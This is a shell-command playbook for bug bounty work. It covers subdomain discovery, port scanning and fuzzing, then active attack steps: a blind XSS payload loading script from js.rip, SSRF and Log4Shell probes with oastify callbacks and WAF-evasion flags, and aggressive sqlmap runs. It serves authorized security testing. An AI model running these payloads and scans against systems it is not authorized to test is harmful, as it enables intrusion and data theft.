# Bug Bounty Recon & Vulnerability Scanning Playbook

> note: only test assets explicitly in scope. replace placeholder tokens before use.

## Scope seed

```bash
nano scope.txt # paste scope here
```

---

## Step 1: Initial Asset Discovery and Subdomain Enumeration

### Assetfinder

```bash
while read domain; do
  echo "[*] Running assetfinder on $domain"
  assetfinder --subs-only "$domain" >> subdomains_assetfinder.txt
done < scope.txt
```

or

```bash
assetfinder --subs-only example.com > subdomains_assetfinder.txt
```

### Subfinder

```bash
subfinder -d example.com -all -recursive > subdomains_subfinder.txt
```

or

```bash
subfinder -dL scope.txt -o subdomains_subfinder.txt
```

### Amass

```bash
amass enum -df scope.txt -passive -o subdomains_amass.txt
```

or

```bash
amass enum -d example.com -o subdomains_amass.txt
```

### GitHub Subdomains

```bash
github-subdomains -t <GITHUB_TOKEN> -d example.com | grep -v '@' | sort -u | grep ".example.com" >> github-subs.txt
```

or

```bash
while read domain; do
  echo "[*] Running github-subdomains for $domain"
  github-subdomains -t <GITHUB_TOKEN> -d "$domain" | grep -v '@' | grep "\.$domain" >> github_subs.txt
done < scope.txt
```

### Cleanup GitHub subs output

```bash
sed -E 's/\x1b\[[0-9;]*m//g; s/^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] *//' github_subs.txt \
| grep -Eo '([a-zA-Z0-9-]+\.)+[a-z]{2,}' | sort -u > tmp && mv tmp github_subs.txt
```

### Clean up Amass output to extract only subdomains

```bash
sed -E 's/\x1b\[[0-9;]*m//g' subdomains_amass.txt \
| grep -Eo '([a-zA-Z0-9-]+\.)+[a-z]{2,}' | sort -u > cleaned_subdomains_amass.txt 
```

### Combine and remove duplicates from all sources

```bash
cat subdomains_assetfinder.txt subdomains_subfinder.txt cleaned_subdomains_amass.txt github_subs.txt \
| sort -u > subdomains_initial.txt
```

### Filter out-of-scope subdomains

```bash
grep -Ff scope.txt subdomains_initial.txt > subdomains_filtered.txt
```

---

## Step 1.1: Subdomain Resolution with shuffledns

```bash
shuffledns -l subdomains_filtered.txt \
  -r /usr/share/seclists/Miscellaneous/dns-resolvers.txt \
  -o subdomains_shuffledns.txt \
  -massdns /usr/local/bin/massdns \
  -mode resolve
```

### Combine post-resolution and dedupe

```bash
cat subdomains_filtered.txt subdomains_shuffledns.txt | sort -u > subdomains.txt
```

---

## Step 2: Active Domains and Open Ports

### HTTP fingerprinting

```bash
httpx -l subdomains.txt \
  -silent -json -title -tech-detect -status-code -web-server -follow-redirects \
  2>httpx.log \
| tee http_finger.json \
| jq -r '.input' | sort -u > alive.txt
```

### Strip scheme for tools needing hostnames only

```bash
sed -E 's#^https?://##' alive.txt | sort -u > cleaned_alive.txt
```

### Build scope roots and regex for filtering

```bash
# scope roots from scope.txt
sed -E 's#^https?://##; s#/.*$##; s/^\*\.\?//; s/^[.]+//; /^[[:space:]]*$/d' scope.txt \
| sort -u > scope_roots.txt

# SCOPE_RE for jq
SCOPE_RE="(^|\\.)($(sed -E 's#^https?://##; s#/.*$##; s/^\*\.\?//; s/^[.]+//; /^[[:space:]]*$/d' scope.txt \
  | sort -u | sed 's/[].[^$*+?(){}|\\/]/\\&/g' | paste -sd'|' -))$" \
jq -r '
  select(type=="object") |
  def techarr: (.tech? // .technologies? // []) | map(tostring);
  def sc: ((.status_code? // ."status-code"? // .code? // 0) | tonumber? // 0);
  def server: (.webserver? // .server? // "");

  select(
    ((.host // "") | test(env.SCOPE_RE)) or
    ((.url  // "") | test(env.SCOPE_RE))
  )
  | select(sc >= 200 and sc < 400)
  | select(
      (techarr|join(",")|test("wordpress|drupal|joomla|laravel|django|rails|express","i")) or
      (techarr|join(",")|test("jenkins|gitlab|sonarqube|grafana|kibana|prometheus|rundeck|keycloak","i")) or
      (techarr|join(",")|test("phpmyadmin|elasticsearch|solr|influxdb|couchdb|mongo","i")) or
      (techarr|join(",")|test("tomcat|jboss|weblogic|websphere|glassfish|wildfly","i")) or
      (server|test("nginx|apache|iis|lighttpd|caddy","i")) or
      ((.title // "")|test("swagger|openapi|graphql|console|dashboard|admin|portal|sso","i"))
    )
  | [.url // "", (sc|tostring), (.title//""), (techarr|join(","))] | @tsv
' http_finger.json | sort -u > interesting.txt

echo "[*] interesting:" $(wc -l < interesting.txt)
head -n 20 interesting.txt
```

### Find allowed HTTP methods

```bash
: > allowed_http_methods.tsv  # clear/create output
while read -r url; do
  [ -z "$url" ] && continue
  u="$url"; case "$u" in http*://*) ;; *) u="https://$u";; esac

  hdrs=$(curl -sS -m 8 -X OPTIONS -D - -o /dev/null \
            -H 'Origin: https://example.com' \
            -H 'Access-Control-Request-Method: GET' \
            "$u" | tr -d '\r')

  code=$(printf '%s\n' "$hdrs" | awk 'toupper($1) ~ /^HTTP\// {print $2; exit}')
  allow=$(printf '%s\n' "$hdrs" | awk -F': ' 'BEGIN{IGNORECASE=1} /^Allow:/ {print $2; exit}')
  acam=$(printf '%s\n' "$hdrs" | awk -F': ' 'BEGIN{IGNORECASE=1} /^Access-Control-Allow-Methods:/ {print $2; exit}')

  if [ -n "$allow$acam" ]; then
    printf '%s\t%s\t%s\t%s\n' "$u" "${code:-?}" "${allow:--}" "${acam:--}" >> allowed_http_methods.tsv
  fi
done < alive.txt
```

### Extract IPs for port scanning (skip common CDN CNAMEs)

```bash
cdn_re='cloudfront\.net|akamai|edgekey\.net|edgesuite\.net|fastly(?:lb)?\.net|cloudflare\.net|cdn\.cloudflare\.net|hwcdn\.net|stackpath(?:dns)?\.com|azureedge\.net|vo\.msecnd\.net|llnwd\.net|edgio\.net|cdn77\.(net|com)|b-cdn\.net'

> ips.txt
while read -r host; do
  if dig +short CNAME "$host" | grep -Eiq "$cdn_re"; then
    continue
  fi
  dig +short A "$host" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
done < cleaned_alive.txt | sort -u >> ips.txt
```

### Aquatone crawl

```bash
cat cleaned_alive.txt | aquatone -ports xlarge -threads 5 -silent
```

### Masscan and Nmap

```bash
sudo masscan -p21,22,23,25,53,69,110,111,135,137,138,139,143,161,389,445,512,513,514,873,990,993,995,1433,1521,2049,2375,3306,3389,3632,4000,4444,5000,5432,5900,5984,6000,6379,7001,8000,8081,8888,9200,11211,27017,50000,50070 \
  --rate 1000 -iL ips.txt -oG interesting_ports.txt

grep -oP 'Host: \K[\d.]+' interesting_ports.txt | sort -u > ip_only.txt

sudo nmap -iL ip_only.txt -sS -sV -v -sC -A -O --top-ports 1000 -T5 -oN nmap_comprehensive_scan.txt
```

---

## Step 3: Technology and WAF Detection

```bash
whatweb -i alive.txt -v -t 5 --color=never \
  --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71' \
  > technologies.txt
```

### WAF detection

```bash
cat alive.txt | xargs -I % wafw00f % -o waf_results.txt
```

### CMS hints with nuclei

```bash
nuclei -l alive.txt -tags wordpress,drupal,joomla -o cms_vulns.txt
```

---

## Step 4: Directory and File Enumeration

```bash
dirsearch -l alive.txt \
  -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip \
  -x 500,200,502,429,404,400 -R 5 --random-agent -t 100 -F \
  -o directory.txt \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### WordPress scans

```bash
wpscan --url https://target.com --enumerate vp,vt,tt,cb,dbe,u --api-token <WPSCAN_API_TOKEN> --force
```

### Quick FFUF hits across hosts

```bash
ffuf -w cleaned_alive.txt:HOST \
     -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt:FUZZ \
     -u https://HOST/FUZZ \
     -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
     -mc 200 \
     -ac \
     -of md \
     -o quickhits_ffuf_results.md
```

---

## Step 5: Parameter Discovery

```bash
# GAU with static ext blacklist
cat alive.txt | gau --blacklist jpg,jpeg,png,gif,css,svg,ico,woff,woff2,ttf,eot,pdf,txt,mp4,mp3,avi,zip,tar,gz,docx,xlsx,pptx,exe,json,svgz \
| sort -u | uro > gau_urls.txt

# Wayback
cat alive.txt | waybackurls | sort -u | uro > wayback_urls.txt

# Katana crawl
katana -list alive.txt -f qurl -o katana_urls.txt

# ParamSpider at scale
paramspider -l alive.txt
cat results/*.txt | sort -u > paramspider_urls.txt

# Combine and normalize, probe for 200/301/302
cat gau_urls.txt wayback_urls.txt katana_urls.txt paramspider_urls.txt \
| sort -u | uro | httpx -silent -mc 200,301,302 > params.txt

# For a single target
echo "target.com" | waybackurls | grep "target.com" > wayback_target.txt
echo "target.com" | gau --subs | grep "target.com" > gau_target.txt
cat wayback_target.txt gau_target.txt | sort -u > all_target_urls.txt

grep "?" all_target_urls.txt | grep "=" > target_param_urls.txt
cat target_param_urls.txt | sed -E 's/.*\?//' | tr '&' '\n' | cut -d'=' -f1 | sort -u > target_params.txt

# Only URLs with query parameters
grep '\?.*=' params.txt > filterparam.txt

# Heuristic param vulns
cat params.txt | kxss > kxss_output.txt
```

---

## Step 6: JavaScript Files Enumeration

```bash
cat filterparam.txt | grep "\.js*" > jsfiles.txt
cat jsfiles.txt | uro | anew jsfiles_cleaned.txt
```

---

## Step 7: Nuclei Scanning

```bash
nuclei -l alive.txt -t exposures/ -t technologies/ -t misconfiguration/ -o exposures.txt
nuclei -l params.txt -t dast/vulnerabilities/xss/ -t dast/vulnerabilities/ssrf/ -t dast/vulnerabilities/sqli/ -dast -o vulns.txt
```

---

## Step 8: Sensitive Data Discovery in JS

```bash
cat jsfiles_cleaned.txt | while read url; do
  python3 ~/SecretFinder/SecretFinder.py -i "$url" -o cli >> secret.txt
done

nuclei -l jsfiles_cleaned.txt -tags prototype-pollution -o proto.txt
nuclei -l jsfiles_cleaned.txt -t ~/nuclei-templates/exposures/ -o js_exposures.txt

# General exposures
nuclei -l alive.txt -t ~/nuclei-templates/exposures/ -o exposures.txt
```

---

## Step 9: Additional Checks (CORS, Subdomain Takeover)

```bash
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl > subzy_results.txt
python3 ~/Corsy/corsy.py -i alive.txt -t 10 --headers $'User-Agent: GoogleBot\nCookie: SESSION=Hacked' | tee corsy_results.txt
```

---

## Step 10: XSS Detection with Payload Injection

```bash
cat alive.txt | httpx -silent | katana -f qurl | gf xss | bxss -a -p '<script src=https://js.rip/d0k></script>' 

dalfox file alive.txt \
  --blind https://js.rip/d0k \
  --deep-domxss \
  --skip-bav \
  --waf-evasion \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" \
  -o xss_results.txt
```

---

## Step 11: Focused Nuclei and Payload Scans

```bash
# Pattern extracts
gf lfi params.txt   > lfi.txt
gf redirect params.txt > redirect.txt
gf ssti params.txt  > ssti.txt
gf ssrf params.txt  > ssrf.txt
gf rce params.txt   > rce.txt
gf sqli params.txt  > sqli.txt
gf xss params.txt   > xss.txt
gf idor params.txt  > idor.txt

# LFI
cat lfi.txt | nuclei -tags lfi \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
  -c 50 -rate-limit 100 -retries 3 -timeout 10 -o lfi_results.txt

# Open Redirect
cat redirect.txt | openredirex -p ~/openredirex/payloads.txt -c 20 > open_redirect_results.txt

# SSTI
cat ssti.txt | nuclei -tags ssti \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
  -c 50 -rate-limit 100 -retries 3 -timeout 10 -o ssti_results.txt

# SSRF: nuclei
cat ssrf.txt | nuclei -tags ssrf -o ssrf_nuclei.txt

# SSRF: collaborator
cat ssrf.txt | qsreplace "http://<COLLAB_ID>.oastify.com" \
| httpx -silent -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
  -threads 100 -timeout 10 -o ssrf_results.txt

# RCE
cat rce.txt | nuclei -tags rce \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
  -c 50 -rate-limit 100 -retries 3 -timeout 10 -o rce_results.txt

# SQLi
sqlmap -m sqli.txt --batch --random-agent --level=5 --risk=3 --threads=10 --output-dir=sqlmap_output

# XSS: Dalfox
dalfox file xss.txt \
  --blind https://js.rip/d0k \
  --deep-domxss \
  --skip-bav \
  --waf-evasion \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" \
  -o xss_results.txt

# XSS: XSStrike (optional)
python3 ~/XSStrike/xsstrike.py --seeds xss.txt --crawl -l 3 --blind > xsstrike_results.txt
```

### IDOR helper

```bash
cat idor.txt | while read url; do
  python3 ~/IDOR-Forge/IDOR-Forge.py -u "$url" -p -m GET --output-format txt
done
```

---

## Step 12: Log4Shell Scan

```bash
python3 ~/log4j-scan/log4j-scan.py -l alive.txt --waf-bypass --run-all-tests --custom-dns-callback-host <COLLAB_ID>.oastify.com
```

---

## Step 13: Fuzz for `package.json` and other package files

```bash
ffuf -w cleaned_alive.txt:HOST \
     -w /usr/share/seclists/Fuzzing/comprehensive_packages_wordlist.txt:FUZZ \
     -u https://HOST/FUZZ \
     -mc 200 \
     -ac \
     -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
     -of md \
     -o package_json_ffuf_results.md
```

---

## Step 14: Discover GraphQL Endpoints

```bash
ffuf -w subdomains.txt:HOST \
     -w /usr/share/seclists/Discovery/Web-Content/graphql.txt:FUZZ \
     -u https://HOST/FUZZ -mc 200,400 -ac \
     -o graphql_ffuf_results.md -of md

cat subdomains.txt | while read url; do 
  python3 ~/graphql-cop/graphql-cop.py -t "$url" -f -H '{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"}' >> graph_cop_results.txt
done
```

---

## Step 15: XXE and XML-ish Endpoints

```bash
# Collect candidates
gau target.com | grep -Ei '\.xml|wsdl|asmx|svc' > gau_xml_endpoints.txt
cat alive.txt | waybackurls | grep -iE '\.xml|wsdl|rss|soap|feed|export|api' | sort -u > waybackurl_xml_endpoints.txt

# Katana dynamic crawl
katana -list alive.txt -f qurl -o katana_xml.txt | grep -iE '\.xml|wsdl|soap|feed|export' > katana_xml.txt 

cat katana_xml.txt waybackurl_xml_endpoints.txt gau_xml_endpoints.txt | sort -u > xml_like_urls.txt

# Probe for XML content-type
cat xml_like_urls.txt | httpx -silent -status-code -title -content-type | grep -i 'xml' > found_xml_urls.txt
```

---

## Aquatone note

```bash
# If a tool rejects schemes in input:
# Use cleaned_alive.txt (no http/https scheme) as input to tools like aquatone
```

---

## Safety and housekeeping

```bash
# Avoid descriptor limits with high-concurrency tools
ulimit -n 100000

# Keep logs and outputs organized by step
mkdir -p outputs && mv *_results.* *_output* *.txt *.md http_finger.json outputs/ 2>/dev/null || true
```
